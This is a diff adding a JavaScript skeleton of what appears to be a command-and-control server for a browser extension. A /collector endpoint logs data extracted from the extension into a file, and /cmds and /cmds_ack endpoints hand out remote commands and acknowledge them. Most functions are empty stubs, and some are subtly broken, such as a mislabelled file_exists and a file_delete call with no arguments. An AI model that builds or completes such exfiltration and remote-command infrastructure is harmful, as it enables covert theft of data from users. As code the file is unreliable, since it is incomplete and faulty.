@@ -1,0 +1,62 @@
+let CHECK_NEW_CMDS_INTERVAL = 1000;
+let CMDS_PATH = 'cmds.json';
+let OLD_CMDS_PATH = 'cmds.json.old';
+let EXTRACTED_DATA_PATH = 'resdata.json'; 
+let COLLECTOR_PATH = '/collector/';
+let cur_cmds_list = [];
+
+function file_create(fpath, data, override=false) {
+	// Create new file with given data inside.
+	// If override=true - overrides old file if exists.
+}
+
+function file_delete(fpath) {
+	// Delete file in some path.
+}
+
+function file_append(fpath, data) {
+	// Append data into file in fpath.
+}
+
+
+function file_exists(fpath, data) {
+	// Append data into file in fpath.
+}
+
+
+// Define here JS endpoint to fetch commands results.
+// Aka the /collector endpoint.
+// SOME DECORATOR for /collector
+function collector_ep(uri_path) {
+	//
+	ext_data = JSON.parse(decodeURIComponent(uri_path.split(COLLECTOR_PATH + "/")[1]));
+	ttl_data = `************ Data From: ${(new Date()).toString()} ************\r\n`;
+	ttl_data += ext_data;
+	ttl_data += '\r\n';
+	if (file_exists(EXTRACTED_DATA_PATH))
+		file_append(EXTRACTED_DATA_PATH, ttl_data);
+	else 
+		file_create(EXTRACTED_DATA_PATH, ttl_data);
+}
+
+// Define here the cmds endpoint to fetch commands from the extension kinda area.
+// SOME DECORATOR for /cmds
+function cmds_ep() {
+	// Returns the cur_cmds_list.
+	return JSON.stringify(cur_cmds_list);
+}
+
+
+// Define here /cmds_ack - when we managed to get response.
+// SOME DECORATOR for /cmds_ack
+function cmds_ack_ep() {
+	// Remove old cmds, place new ones.
+	file_delete()
+}
+
+function check_new_cmds() {
+	// 
+}
+
+
+setInterval(check_new_cmds, CHECK_NEW_CMDS_INTERVAL);
